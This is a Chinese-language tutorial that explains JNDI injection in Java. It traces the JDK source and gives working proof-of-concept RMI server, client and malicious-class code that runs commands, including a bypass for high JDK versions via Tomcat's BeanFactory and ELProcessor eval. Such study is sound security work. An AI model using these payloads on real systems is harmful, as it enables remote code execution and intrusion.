# Java安全-JNDI注入

**JNDI(Java Naming and Directory Interface)**是Java提供的**Java 命名和目录接口**。通过调用**JNDI**的**API**应用程序可以定位资源和其他程序对象。JNDI是Java EE的重要部分，JNDI可访问的现有的目录及服务有：**JDBC、LDAP、RMI、DNS、NIS、CORBA**

首先来介绍一下JNDI的具体内容

#### Naming Service 命名服务：

**这就是JNDI中的N**

命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等，简单的说，就是把一个名称绑定到一个对象上，以方便后续的查找

在名称系统中，有几个重要的概念。
`Bindings`: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 `DNS` 中域名绑定到对应的 `IP`。
`Context`: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。这个概念比较抽象，我个人的理解就是一个前后文环境的意思，比如在文件系统中，一个目录就是一个上下文，你需要查找该目录中的文件，就需要去到这个目录中，所以这个目录就可以理解为这个文件的环境，其中子目录也可以称为子上下文 (`subcontext`)。
`References`: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为C语言中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态，



#### Directory Service 目录服务：

**这就是JNDI中的D**

是命名服务的扩展，除了提供名称和对象的关联，**还允许对象具有属性**，比如一个文件，它的属性就是文件大小、文件类型等，目录服务就可以通过这些特定的属性，去寻找相关对象。目录服务中的对象称之为目录对象，目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作，我们不仅可以根据名称去查找(`lookup`)对象(并获取其对应属性)，还可以根据属性值去搜索(`search`)对象。。

总而言之，目录服务也是一种特殊的名称服务，关键区别是在目录服务中通常使用搜索(`search`)操作去定位对象，而不是简单的根据名称查找(`lookup`)去定位。

下文中命名和目录服务简称为目录服务



#### JNDI架构：

根据上面的介绍，我们知道目录服务是中心化网络应用的一个重要组件，什么意思呢，比如DNS就是一种目录服务，域名就相当于一个名称，这个名称所对应的IP地址就相当于一个对象，通过域名去查找IP地址的服务，就是一个目录服务，Java除了这种常规的用法，就是用目录服务作为对象存储的系统，用目录服务来存储和获取对象

比如对于打印机服务，我们可以通过在目录服务中查找打印机，并获得一个打印机对象，基于这个 `Java` 对象进行后续的操作，比如打印，复印等……

![JNDI架构图.png](https://raw.githubusercontent.com/Em4non/image-hosting/master/a54a33c8-705e-4d44-9489-e46309db60da.png)

如上图所示，**JNDI**在架构上主要包含两个部分，分别是**JNDI API**和**JNDI SPI**，即应用层接口和服务供应接口，其中API比较简单，主要就是java应用程序调用的命名服务的接口，下面详细说一下SPI的相关内容

`SPI` 全称为 `Service Provider Interface`，即**服务供应接口**，比如java的JDBC SPI，我们在连接不同的数据库时，比如Mysql，Oracle之类的数据库，就是通过JDBC SPI进行连接的，这个JNDI SPI也是一样的概念，使用者可以使用官方已经有的SPI，或者去下载第三方提供的SPI进行使用，无需自己重复修改代码，简单的说，我们能直接调用到的就是API的接口，而java内部调用的，我们看不到的部分，就是SPI接口

有三个JDK自带的SPI

`RMI`: `Java Remote Method Invocation`，`Java` 远程方法调用；
`LDAP`: 轻量级目录访问协议；
`CORBA`: `Common Object Request Broker Architecture`，通用对象请求代理架构，用于 `COS` 名称服务(`Common Object Services`)；

我们接下来讲的就是利用RMI去实现JNDI注入

简单介绍一下RMI：

RMI是一种跨JVM进行方法调用的技术，RMI核心特点之一就是**动态类加载**，如果当前JVM中没有某个类的定义，它可以从远程URL到另一个JVM去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象的本体复制一份传递给客户端，而是传递了一个远程对象的Stub，Stub基本上相当于是远程对象的引用或者代理，可以理解为一个包含某些信息的指针。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等

也就是相当于利用RMI这个服务去远程加载类，先在RMI服务上绑定了一个对象，通过JNDI去获取调用RMI，然后获取到RMI绑定的那个对象，然后远程将其下载到本地，具体可以看这两张图来理解RMI的远程调用过程

![RMI注册表](https://raw.githubusercontent.com/Em4non/image-hosting/master/Post-RMI-Registry.png)

RMI远程有一个叫注册中心的东西，它里面有一个RMI注册表（RMIRegistry），服务端现在注册表里登记这个方法，然后当客户端进行查询的时候，注册中心给客户端返回一个叫Stub的代理，然后通过代理跟服务端进行交流

![RMI远程调用](https://raw.githubusercontent.com/Em4non/image-hosting/master/Post-RMI-Invoke.png)

1. Server端监听一个端口，这个端口是JVM随机选择的；
2. Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；
3. Client端可以调用Stub上的方法；
4. Stub连接到Server端监听的通信端口并提交参数；
5. 远程Server端上执行具体的方法，并返回结果给Stub；
6. Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；



那么有人可能会问了，那我直接通过RMI进行命令执行不行吗，用JNDI跟单纯的使用RMI服务有什么区别呢，在单纯的使用RMI服务的时候，你调用的方法是在远程服务器端执行的，然后将结果返回到客户端上，而不是将这个方法下载到你的客户端，然后本地执行

举个例子就是，如果RMI绑定的类的`exec`方法的作用是命令执行弹出计算器或者弹个shell之类的，那么使用的如果是RMI的lookup的话，得到RMI的那个对象后然后调用`exec`方法，不是在你的本地弹计算器，而是会到远程的RMI服务器那里弹计算器，所以这种方法是行不通的

那我们用JNDI注入，是如何实现攻击的呢

在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。

我们举一个例子，当我本地的客户端调用JNDI的lookup方法去获取一个叫testObj的远程对象的时候，会从RMI注册中心上获取到一个Reference 类的存根，也就是说相当于我这个RMI的注册中心绑定的不是具体的方法，而是返回一个Reference类，这个类才指向具体方法，然后客户端在获取到了这个Reference 类的之后，会在本地先进行查找其绑定的方法，如果在本地未找到，则会到远程服务器`http://example.com:8888/testClassName.class`动态加载class，然后调用具体需要调用的方法

整个利用流程如下：

1. 目标代码中调用了Context.lookup(URL)，且URL为用户可控；
2. 攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name，然后去调用JNDI的lookup；
3. 攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；
4. 目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；
5. 攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；

然后我们来看一个简单的**JNDI结合RMI的Reference注入实例**（低版本）

通过上例可以看出JNDI是可以和RMI结合使用的，而攻击就要通过**References**类来绑定一个外部的远程对象的方式进行了。

```java
Reference(String className, RefAddr addr, String factory, String factoryLocation)
```

- `className` ： 远程加载时所使用的类名
- `classFactory `： 加载的`class`中需要实例化类的名称
- `classFactoryLocation` ： 提供`classes`数据的地址可以是`file/ftp/http`协议

##### Server端

```java
package JNDI.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws Exception{
        //设置RMI远程对象通信的IP地址，这里如果在远程vps上的话需要设置
        System.setProperty("java.rmi.server.hostname","127.0.0.1");
        //启动一个注册中心的服务Rmi Registry
        Registry registry = LocateRegistry.createRegistry(1099);
        //构造一个Reference对象，Evil为需要实例化的类名，http://127.0.0.1/为远程查找地址
        Reference feng = new Reference("1","Evil","http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(feng);
        //注册中心绑定feng这个名字绑定到referenceWrapper这个对象，实际上就是往Hash表里添加kv
        registry.bind("feng",referenceWrapper);
    }
}
```

简单概括下上述代码：起一个Registry注册中心，构造一个reference对象绑定到对应的注册中心，并命名为feng；

##### Client端

```java
package JNDI.client;

import javax.naming.Context;
import javax.naming.InitialContext;

public class Client {
    public static void main(String[] args) throws Exception {
        String url = "rmi://127.0.0.1:1099/feng";
        //新建一个上下文对象
        Context context = new InitialContext();
        //从url获取具体的内容
        context.lookup(url);
    }
}
```

构造reference对象的时候传入的三个变量指向一个远程的恶意类地址以及其类名，所以这里我们在起服务之前要先准备好对应恶意类：

恶意类：恶意类在准备的时候，这里我们可以将恶意的代码放到两个部分，初始代码里面，或者构造方法里面都可以，最终都会被执行，只不过是先后顺序

一般在loadclass里面的调用Class.forName的时候传入了true就会触发初始化，而构造方法则在newInstance的时候触发，具体是如何实现的可以看下文的代码部分

##### 恶意类

```java
package JNDI;
public class Evil {
    public Evil() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}
```

![image-20221216112115781](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221216112115781.png)

可以看到在执行了Client代码后，弹出了计算器，并报错，为什么会报错也很好理解，这里传入的Evil这个类并不是JNDI里面想要的Factory类，从报错内容来看可以看出这里原本想要得到的类是一个继承了javax.naming.spi.ObjectFactory类的类。

接下来我们来看看JNDI客户端里面怎么触发的加载类:

整个的调用链如下：

![image-20221216112532424](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221216112532424.png)

我们可以从上下文对象的lookup处开始跟进，这是调用了一个根据URL去初始化上下文对象（rmiURLContext）的一个lookup

```java
public Object lookup(String name) throws NamingException {
    //在这个地方返回了rmiURLContext
    return getURLOrDefaultInitCtx(name).lookup(name);//name=rmi://127.0.0.1:1099/feng
}
```

然后我们继续跟进lookup

```java
public Object lookup(String var1) throws NamingException {
    ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);//通过var1，也就是传入的URL获取注册中心相关信息
    Context var3 = (Context)var2.getResolvedObj();

    Object var4;
    try {
        var4 = var3.lookup(var2.getRemainingName());//根据传入参数不同，调用不同的lookup方法
    } finally {
        var3.close();
    }
    return var4;
}
```

我们可以看到，它先通过var1这个传入的RMI的URL去获取了相关信息，然后在var3的地方根据传入参数类型的不同，使用不同的Context的lookup方法进行下一步

![image-20221216113254624](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221216113254624.png)

继续跟进var3的lookup，这里调用的var3的lookup，而var3是RegistryContext，所以虽然我们通过JNDI的方式进行调用，但是最后还是会调用到RMI的流程中，所以这也就是JNDI能结合RMI使用的原因（**JNDI的每个服务对应一个Context协议，而RMI对应的协议就是RegistryContext**）

```java
public Object lookup(Name var1) throws NamingException {
    if (var1.isEmpty()) {
        return new RegistryContext(this);
    } else {
        Remote var2;
        try {
            var2 = this.registry.lookup(var1.get(0));
        } catch (NotBoundException var4) {
            throw new NameNotFoundException(var1.get(0));
        } catch (RemoteException var5) {
            throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
        }

        return this.decodeObject(var2, var1.getPrefix(1));
    }
}
```

发现还是会调用lookup，这里调用的是registry.lookup，拿到了我们构造的ReferenceWrapper对象，然后调用this.decodeObject来处理该对象：

![image-20221213174022915](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221213174022915.png)

然后进入到decodeObject

```java
private Object decodeObject(Remote var1, Name var2) throws NamingException {
    try {
        Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
        return NamingManager.getObjectInstance(var3, var2, this, this.environment);
    }
```

由于我们拿到的远程对象是一个ReferenceWrapper类的对象，所以需要先调用getReference()这个方法去获取到Reference对象，也就是我们在服务端构造的对象

然后var3就是我们的Reference对象了

![image-20221214113749447](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221214113749447.png)

然后进入到getObjectInstance方法中，这个方法是用来获取相关对象的实例的，也就是用来获取我们之前传入的远程对象的实例

```java
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment)
    throws Exception
{

    ObjectFactory factory;

    // Use builder if installed
    ObjectFactoryBuilder builder = getObjectFactoryBuilder();
    if (builder != null) {
        // builder must return non-null factory
        factory = builder.createObjectFactory(refInfo, environment);
        return factory.getObjectInstance(refInfo, name, nameCtx,
            environment);
    }

    // Use reference if possible
    Reference ref = null;
    if (refInfo instanceof Reference) {
        ref = (Reference) refInfo;
    } else if (refInfo instanceof Referenceable) {
        ref = ((Referenceable)(refInfo)).getReference();
    }

    Object answer;

    if (ref != null) {
        String f = ref.getFactoryClassName();
        if (f != null) {
            // if reference identifies a factory, use exclusively

            factory = getObjectFactoryFromReference(ref, f);
            if (factory != null) {
                return factory.getObjectInstance(ref, name, nameCtx,
                                                 environment);
            }
            // No factory found, so return original refInfo.
            // Will reach this point if factory class is not in
            // class path and reference does not contain a URL for it
            return refInfo;

        } else {
            // if reference has no factory, check for addresses
            // containing URLs

            answer = processURLAddrs(ref, name, nameCtx, environment);
            if (answer != null) {
                return answer;
            }
        }
    }

    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}
```

首先在第一个地方由于builder为空，所以会继续往下执行到这个地方

```java
factory = getObjectFactoryFromReference(ref, f);
if (factory != null) {
    return factory.getObjectInstance(ref, name, nameCtx,
                                     environment);
}
```

我们可以看出，这段代码的大概意思就是判断当reference对象存在的时候尝试从refenence还原出对应的ObjectFactory对象，而getObjectFactoryFromReference这个方法就是想要从我们传入的Reference对象中获取到一个ObjectFactory对象，也就是获取传入对象的对象工厂

然后我们继续跟进这个getObjectFactoryFromReference()这个方法，看看它是如何获取工厂对象的

```java
static ObjectFactory getObjectFactoryFromReference(
    Reference ref, String factoryName)
    throws IllegalAccessException,
    InstantiationException,
    MalformedURLException {
    Class<?> clas = null;

    //第一部分
    // Try to use current class loader
    try {
         clas = helper.loadClass(factoryName);
    } catch (ClassNotFoundException e) {
        // ignore and continue
        // e.printStackTrace();
    }
    // All other exceptions are passed up.
 
        
    //第二部分
    // Not in class path; try to use codebase
    String codebase;
    if (clas == null &&
            (codebase = ref.getFactoryClassLocation()) != null) {
        try {
            clas = helper.loadClass(factoryName, codebase);
        } catch (ClassNotFoundException e) {
        }
    }

        
    //第三部分
    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
```

我们可以把这个方法分成三个部分来看

第一部分就是尝试使用本地的加载器来加载，这里是正常的本地类加载，其实就是Appclassloader，很明显本地肯定加载不到factoryName，因为这个factoryName是我们构造Reference对象的时候传入的恶意类的类名，即Evil，所以本地是找不到的

第二部分则是判断对应的reference对象里面有没有传入codebase即（codebase = ref.getFactoryClassLocation()），也就是这个远程对象的地址URL，然后在这个地址的基础上去找文件，通过调用helper.loadClass(name,codebase)来实现，跟进的话会发现调用了URLClassLoader进行类加载

第三部分就是在获取到对应类之后，调用newInstance获取类的实例，并将这个工厂实例返回，从而达到从Reference获取工厂实例的目的

这里我们详细看一下第二部分中helper.loadClass(name,codebase)怎么实现的

```java
public Class<?> loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {

    ClassLoader parent = getContextClassLoader();
    ClassLoader cl =
             URLClassLoader.newInstance(getUrlArray(codebase), parent);

    return loadClass(className, cl);
}
```

![image-20221214172424015](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221214172424015.png)

可以看见，代码创建了一个新的URLClassLoader对象去加载className，然后我们继续跟进这个loadClass

```java
Class<?> loadClass(String className, ClassLoader cl)
    throws ClassNotFoundException {
    Class<?> cls = Class.forName(className, true, cl);
    return cls;
}
```

由于Class.forName的第二个参数默认就是true，所以这里会做初始化进行类的加载，如果我们在恶意类里面的相关命令执行的代码写到的是初始化模块里面，也就是静态代码块，则在这里就会触发了，如果是在构造方法里面写的相关命令执行的代码则是在newInstance里面触发

![image-20221214172612315](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221214172612315.png)



可以看一下当前的cl，也就是当前的URLClassLoader对象，是到对应地址去加载了

然后在加载到了这个class对象后，一步步回到之前生成工厂类的地方

```java
return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
```

在这个地方进行了newInstance操作，从而调用了无参构造器，执行了无参构造器里面的代码，这也是为什么我们把恶意代码写到无参构造器里面的原因

然后再往前return一步，也就是到getObjectInstance这个通过工厂将对象实例化的地方

```java
if (factory != null) {
    return factory.getObjectInstance(ref, name, nameCtx,
                                     environment);
}
```

如果得到了对象且成功转换成了`ObjectFactory`，就会调用`getObjectInstance`方法，至此JNDI注入完成，达到了RCE的目的



接下来看一下高版本是如何实现的

在JDK8u121之后Oracle对上述利用JNDI-rmi实现的任意代码执行做了相关修复，准确的说应该是做了相关限制， `com.sun.jndi.rmi.object.trustURLCodebase` 默认值为`false`，运行时需加入参数 `Dcom.sun.jndi.rmi.object.trustURLCodebase=true` 。因为如果 `JDK` 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 `RMI` 代码

可以看到在选用了JDK8u151之后，已经无法进行命令执行了，报了The object factory is untrusted的错

![image-20221217112056638](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221217112056638.png)

在高版本的情况下，我们有两种方式进行绕过

1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。
2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。

![JNDI流程](https://raw.githubusercontent.com/Em4non/image-hosting/master/%E6%97%A0%E6%A0%87%E9%A2%98.png)



从这张流程图可以看到JNDI的流程，和两个JDK的具体修复点

但是可以看出，这两个修复都有同一个绕过方式，那就是传入的Reference对象里面不存在FactoryLocation属性，且本地能加载对应的ClassName，那么我们就可以利用本地的Class作为Reference Factory

那我们可以令 `ref.getFactoryClassLocation()` 返回空。即，让 `ref` 对象的 `classFactoryLocation` 属性为空，这个属性表示引用所指向对象的对应 `factory` 名称，对于远程代码加载而言是 `codebase`，即远程代码的 `URL` 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 `factory` 是本地代码，则该值为空，这是绕过高版本 `JDK` 限制的关键

要满足这种情况，我们只需要在远程 `RMI` 服务器返回的 `Reference` 对象中不指定 `Factory` 的 `codebase`，然后它在loadClass的地方，就会从本地进行加载，然后我们可以看一下 `javax.naming.spi.NamingManager` 的一个getObjectInstance的解析过程

```java
public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment)
    throws Exception
{
    ObjectFactory factory;

    // Use builder if installed
    ObjectFactoryBuilder builder = getObjectFactoryBuilder();
    if (builder != null) {
        // builder must return non-null factory
        factory = builder.createObjectFactory(refInfo, environment);
        return factory.getObjectInstance(refInfo, name, nameCtx,
            environment);
    }

    // Use reference if possible
    Reference ref = null;
    if (refInfo instanceof Reference) {
        ref = (Reference) refInfo;
    } else if (refInfo instanceof Referenceable) {
        ref = ((Referenceable)(refInfo)).getReference();
    }

    Object answer;

    if (ref != null) {
        String f = ref.getFactoryClassName();
        if (f != null) {
            // if reference identifies a factory, use exclusively
            factory = getObjectFactoryFromReference(ref, f);
            if (factory != null) {
                return factory.getObjectInstance(ref, name, nameCtx,
                                                 environment);
            }
            // No factory found, so return original refInfo.
            // Will reach this point if factory class is not in
            // class path and reference does not contain a URL for it
            return refInfo;
        } else {
            // if reference has no factory, check for addresses
            // containing URLs
            answer = processURLAddrs(ref, name, nameCtx, environment);
            if (answer != null) {
                return answer;
            }
        }
    }
    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}
```

可以看到，在处理 `Reference` 对象时，会先调用 `ref.getFactoryClassName()` 获取对应工厂类的名称，也就是会先从本地的`CLASSPATH`中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即之前低版本JNDI注入的情况

所以，我们可以指定一个存在于目标 `classpath` 中的工厂类名称，交由这个工厂类去实例化实际的目标类(即引用所指向的类)，从而间接实现一定的代码控制

总结一下，满足要求的工厂类条件：

1. 存在于目标本地的 `CLASSPATH` 中

2.  实现 `javax.naming.spi.ObjectFactory` 接口

3. 至少存在一个 `getObjectInstance()` 方法

   然后我们先看一下哪些类继承了ObjectFactory

   ![image-20221219150943147](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221219150943147.png)

然后我们找到了`org.apache.naming.factory.BeanFactory`这个类是可以利用的

```java
public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws NamingException {
    if (obj instanceof ResourceRef) {
        NamingException ne;
        try {
            Reference ref = (Reference)obj;
            String beanClassName = ref.getClassName();
            Class<?> beanClass = null;
            ClassLoader tcl = Thread.currentThread().getContextClassLoader();
            //1.反射获取Class类对象
            if (tcl != null) {
                try {
                    beanClass = tcl.loadClass(beanClassName);
                } catch (ClassNotFoundException var26) {
                }
            } else {
                try {
                    beanClass = Class.forName(beanClassName);
                } catch (ClassNotFoundException var25) {
                    var25.printStackTrace();
                }
            }
			
            if (beanClass == null) {
                throw new NamingException("Class not found: " + beanClassName);
            } else {
                BeanInfo bi = Introspector.getBeanInfo(beanClass);
                PropertyDescriptor[] pda = bi.getPropertyDescriptors();
                // 2. 初始化类实例
                Object bean = beanClass.newInstance();
                // 3. 根据 Reference 的属性查找 setter 方法的别名
                RefAddr ra = ref.get("forceString");
                Map<String, Method> forced = new HashMap();
                String value;
                String propName;
                int i;
                if (ra != null) {
                    value = (String)ra.getContent();
                    Class<?>[] paramTypes = new Class[]{String.class};
                    // 4. 循环解析别名并保存到字典中
                    String[] arr$ = value.split(",");
                    i = arr$.length;

                    for(int i$ = 0; i$ < i; ++i$) {
                        String param = arr$[i$];
                        param = param.trim();
                        int index = param.indexOf(61);
                        if (index >= 0) {
                            propName = param.substring(index + 1).trim();
                            param = param.substring(0, index).trim();
                        } else {
                            propName = "set" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);
                        }

                        try {
                            forced.put(param, beanClass.getMethod(propName, paramTypes));
                        } catch (SecurityException | NoSuchMethodException var24) {
                            throw new NamingException("Forced String setter " + propName + " not found for property " + param);
                        }
                    }
                }
				// 5. 解析所有属性，并根据别名去调用 setter 方法
                Enumeration<RefAddr> e = ref.getAll();

                while(true) {
                    while(true) {
                        do {
                            do {
                                do {
                                    do {
                                        do {
                                            if (!e.hasMoreElements()) {
                                                return bean;
                                            }

                                            ra = (RefAddr)e.nextElement();
                                            propName = ra.getType();
                                        } while(propName.equals("factory"));
                                    } while(propName.equals("scope"));
                                } while(propName.equals("auth"));
                            } while(propName.equals("forceString"));
                        } while(propName.equals("singleton"));

                        value = (String)ra.getContent();
                        Object[] valueArray = new Object[1];
                        Method method = (Method)forced.get(propName);
                        if (method != null) {
                            valueArray[0] = value;

                            try {
                                method.invoke(bean, valueArray);
```

我们可以分析一下他的getObjectInstance方法，简单来说就是实例化Bean class然后调用1个setter方法，重点是这些：

```java
Object bean = beanClass.newInstance();

method.invoke(bean, valueArray);
```

可以看一下这个invoke反射调用的是什么方法：其中valueArray是一个String类型的变量，所以这里我们要找一个只用一个String参数就能实现命令执行的方法，然后想办法构造，使其对象在getObjectInstance中被还原并调用该方法，然后传入命令执行的参数

按照上面的思路，我们找到的是Tomcat下的ELProcessor类，`ELProcessor`的eval方法会对EL表达式求值，实现RCE

![image-20221219173817821](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221219173817821.png)

 所以整个绕过流程就是：
为了绕过`ConfigurationException`，需要满足`ref.getFactoryClassLocation()` 为空，也就是在远程 `RMI` 服务器返回的 `Reference` 对象中不指定 `Factory` 的 `codebase`
来到`NamingManager`，需要在攻击者本地`CLASSPATH`找到这个`Reference Factory`类并且在其中一块代码能执行`payload`，找到了`BeanFactory`
`BeanFactor`使用`newInstance`创建实例，所以只能调用无参构造，这就要求目标 `class` 得有无参构造方法且有办法执行相关命令，于是找到`ELProcessor`和`GroovyShell`
总结起来就是绕过了`ConfigurationException`，进入`NamingManager`，使用`BeanFactor`创建`ELProcessor`/`GroovyShell`无参实例，然后`BeanFactor`根据别名去调用方法（执行`ELProcessor`中的`eval`方法）

然后我们来写一个server端

```java
package JNDI.高版本;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
public class server {
    public static void main(String[] args) throws Exception{
        //在本机1099端口开启rmi registry
        Registry registry = LocateRegistry.createRegistry(1099);
        //构造一个ResourceRef对象
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor",null,
                "","",true,"org.apache.naming.factory.BeanFactory",null);
		//对invoke时执行的方法赋值
        ref.add(new StringRefAddr("forceString","feng=eval"));
        //需要执行的命令
        ref.add(new StringRefAddr("feng","Runtime.getRuntime().exec(\"calc\")"));
        //绑定构造的ResourceRef对象
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit",referenceWrapper);

    }
}
```

client端

```java
package JNDI.高版本;

import javax.naming.InitialContext;
public class client {
    public static void main(String[] args)throws  Exception {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("rmi://127.0.0.1:1099/evil");
    }
}
```

可以看到成功弹出计算器

![image-20221219175051717](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221219175051717.png)

然后我们来分析一下它的调用链

![image-20221219175135309](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221219175135309.png)

我们直接来看BeanFactory里面的getObjectInstance方法的实现，因为前面的和之前低版本的一样（ResourceRef是Reference的子类），因为本地存在BeanFactory依赖，所以本地的AppClassLoader直接就加载到了BeanFactory对象，获取其实例之后调用getObjectInstance方法：

首先判断传入对象的类型是否为ResourceRef对象，这也是为什么我们之前构造的是ResourceRef对象

![image-20221219175325292](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221219175325292.png)

然后将其强转成Reference对象，获取其className属性（其实就是我们构造时传入的javax.el.ELProcessor）,通过AppClassLoader加载获取到其Class对象

![image-20221219175350771](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221219175350771.png)

然后获取到其实例对象并命名为bean

![image-20221219175415879](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221219175415879.png)

接下来，对Reference里面的forceString内容进行如下处理，如下图，最终得到的method是eval，参数param是feng

![image-20221219175453862](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221219175453862.png)

后通过一个循环取出feng对应的Context：如下图，其实就是我们想要执行的代码

![image-20221219175722548](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221219175722548.png)

最后通过之前的forced map将前面的eval Method取出来：如下图，并且当Method不为空的时候就直接利用反射调用之前的bean（ELProcessor）的method（eval）方法，并传入参数为RefAddr里面的feng参数的内容。从而触发任意代码执行。

![image-20221219175753745](https://raw.githubusercontent.com/Em4non/image-hosting/master/image-20221219175753745.png)

以上就是比较常规通用绕过方式









